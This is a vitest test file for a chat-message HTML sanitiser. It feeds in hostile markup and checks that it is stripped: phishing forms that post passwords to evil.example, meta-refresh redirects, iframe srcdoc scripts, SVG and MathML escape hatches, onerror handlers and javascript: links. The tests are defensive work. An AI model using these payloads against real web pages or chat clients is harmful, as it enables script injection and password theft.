/**
 * The message-body sanitiser every design's chat row renders through.
 *
 * A message is the one piece of untrusted HTML anybody in a channel can put in
 * front of everybody else, and a stock Mumble client's source tab or a bot can
 * write any markup it likes into one.
 */

import { describe, expect, it } from "vitest";
import { sanitizeHtml, sanitizeMessageHtml } from "../sanitizeHtml";
import { sanitizeBio } from "../bioSanitize";

/** Sanitise and parse back into a document to query. */
function render(html: string): Document {
  return new DOMParser().parseFromString(`<body>${sanitizeMessageHtml(html)}</body>`, "text/html");
}

const PNG =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";

describe("sanitizeMessageHtml: what restyles or replaces the app", () => {
  it("drops a <style> block, which would apply to the whole document", () => {
    const doc = render("x<style>*{display:none}</style>");
    expect(doc.querySelector("style")).toBeNull();
    expect(doc.body.textContent).toBe("x");
  });

  it.each(["link", "meta", "base"])("drops <%s>, which reaches the document head", (tag) => {
    const doc = render(
      `a<${tag} rel="stylesheet" href="https://evil.example/x" http-equiv="refresh" content="0;url=https://evil.example">b`,
    );
    expect(doc.querySelector(tag)).toBeNull();
    expect(doc.body.innerHTML).not.toContain("evil.example");
  });

  it("drops a phishing form and every control in it", () => {
    const doc = render(
      'x<form action="https://evil.example/p" method="post"><label>Password</label><input type="password" name="pw"><textarea></textarea><select><option>a</option></select><button formaction="https://evil.example/b">Login</button></form>',
    );
    for (const tag of ["form", "input", "button", "textarea", "select", "option", "label"]) {
      expect(doc.querySelector(tag)).toBeNull();
    }
    expect(doc.body.innerHTML).not.toContain("evil.example");
  });

  it("drops a form control standing on its own, with its formaction", () => {
    const doc = render(
      '<button formaction="https://evil.example/b" form="f">Go</button><input formaction="https://evil.example">',
    );
    expect(doc.querySelector("button, input")).toBeNull();
    expect(doc.body.innerHTML).not.toContain("evil.example");
  });

  it("drops an image map, which is a link the anchor guard never sees", () => {
    const doc = render(
      `<img src="${PNG}" usemap="#m"><map name="m"><area shape="rect" coords="0,0,9,9" href="https://evil.example"></map>`,
    );
    expect(doc.querySelector("map, area")).toBeNull();
    expect(doc.querySelector("img")?.hasAttribute("usemap")).toBe(false);
    expect(doc.body.innerHTML).not.toContain("evil.example");
  });

  it.each([
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<iframe src="https://evil.example"></iframe>',
    '<frameset><frame src="https://evil.example"></frameset>',
    '<object data="https://evil.example/x.swf"></object>',
    '<embed src="https://evil.example/x.swf">',
    '<svg><foreignObject><form action="https://evil.example"><button>x</button></form></foreignObject></svg>',
    '<math><mtext><form action="https://evil.example"></form></mtext></math>',
    '<dialog open style="position:fixed">x</dialog>',
  ])("drops embedded documents and their escape hatches: %s", (html) => {
    const doc = render(html);
    expect(
      doc.querySelector(
        "iframe, frame, frameset, object, embed, svg, foreignObject, math, form, button, dialog",
      ),
    ).toBeNull();
    expect(doc.body.innerHTML).not.toContain("evil.example");
    expect(doc.body.innerHTML).not.toContain("srcdoc");
  });

  it("cuts inline styles to the safe list, so no message can cover the window", () => {
    const doc = render('<span style="position:fixed;inset:0;z-index:99999;color:red">x</span>');
    const span = doc.querySelector("span")!;
    expect(span.style.position).toBe("");
    expect(span.style.zIndex).toBe("");
    expect(span.style.color).toBe("red");
  });

  it("drops event handlers and script", () => {
    const doc = render(
      `<img src="${PNG}" onerror="alert(1)"><script>alert(1)</script><b onclick="alert(1)">b</b>`,
    );
    expect(doc.querySelector("script")).toBeNull();
    expect(doc.body.innerHTML).not.toContain("alert");
  });
});

describe("sanitizeMessageHtml: links", () => {
  it("marks every link for the guard and opens it outside the window", () => {
    const a = render('<a href="https://example.com/x">x</a>').querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://example.com/x");
    expect(a.dataset["external"]).toBe("true");
    expect(a.getAttribute("target")).toBe("_blank");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("keeps the text of a link with an unsafe scheme and drops its href", () => {
    const a = render('<a href="javascript:alert(1)">click</a>').querySelector("a")!;
    expect(a.hasAttribute("href")).toBe(false);
    expect(a.textContent).toBe("click");
  });

  it("turns a remote picture into a link instead of fetching it", () => {
    const doc = render('<img src="https://tracker.example/p.png">');
    expect(doc.querySelector("img")).toBeNull();
    expect(doc.querySelector("a")?.dataset["external"]).toBe("true");
  });
});

describe("sanitizeMessageHtml: what a message legitimately carries", () => {
  it("keeps inline formatting", () => {
    const doc = render("<b>bold</b> <i>it</i> <u>u</u> <s>s</s> <strong>st</strong> <em>em</em>");
    expect(doc.querySelector("b")?.textContent).toBe("bold");
    expect(doc.querySelector("em")?.textContent).toBe("em");
  });

  it("keeps inline pictures, clips and their spoiler marker", () => {
    const doc = render(
      `<img src="${PNG}" alt="cat" data-spoiler="1"><video src="data:video/mp4;base64,AAAA" controls>clip</video>`,
    );
    const img = doc.querySelector("img")!;
    expect(img.getAttribute("src")).toBe(PNG);
    expect(img.dataset["spoiler"]).toBe("1");
    expect(doc.querySelector("video")?.hasAttribute("controls")).toBe(true);
  });

  it("keeps code blocks, lists, quotes, tables and details", () => {
    const doc = render(
      "<pre><code>let x = 1;</code></pre><ul><li>a</li></ul><ol><li>b</li></ol><blockquote>q</blockquote><table><tr><td>c</td></tr></table><details><summary>s</summary>d</details>",
    );
    expect(doc.querySelector("pre code")?.textContent).toBe("let x = 1;");
    for (const tag of ["ul", "ol", "li", "blockquote", "table", "td", "details", "summary"]) {
      expect(doc.querySelector(tag)).not.toBeNull();
    }
  });

  it("keeps a mention chip's data attributes and class", () => {
    const chip = render('<span class="mention" data-mention-session="7">@lore</span>').querySelector("span")!;
    expect(chip.className).toBe("mention");
    expect(chip.dataset["mentionSession"]).toBe("7");
  });

  it("keeps the legacy <font> markup stock Mumble sends", () => {
    const font = render('<font color="#ff0000" size="4">red</font>').querySelector("font")!;
    expect(font.getAttribute("color")).toBe("#ff0000");
  });
});

describe("a body that parses as a frameset document", () => {
  // It has no `<body>`, DOMPurify returns null for it, and every renderer that
  // then walked the fragment threw - one message broke the row for everyone.
  it.each([
    ["sanitizeMessageHtml", sanitizeMessageHtml],
    ["sanitizeHtml", sanitizeHtml],
    ["sanitizeBio", sanitizeBio],
  ])("%s returns nothing instead of throwing", (_name, sanitize) => {
    expect(sanitize('<frameset><frame src="https://evil.example"></frameset>')).toBe("");
  });
});
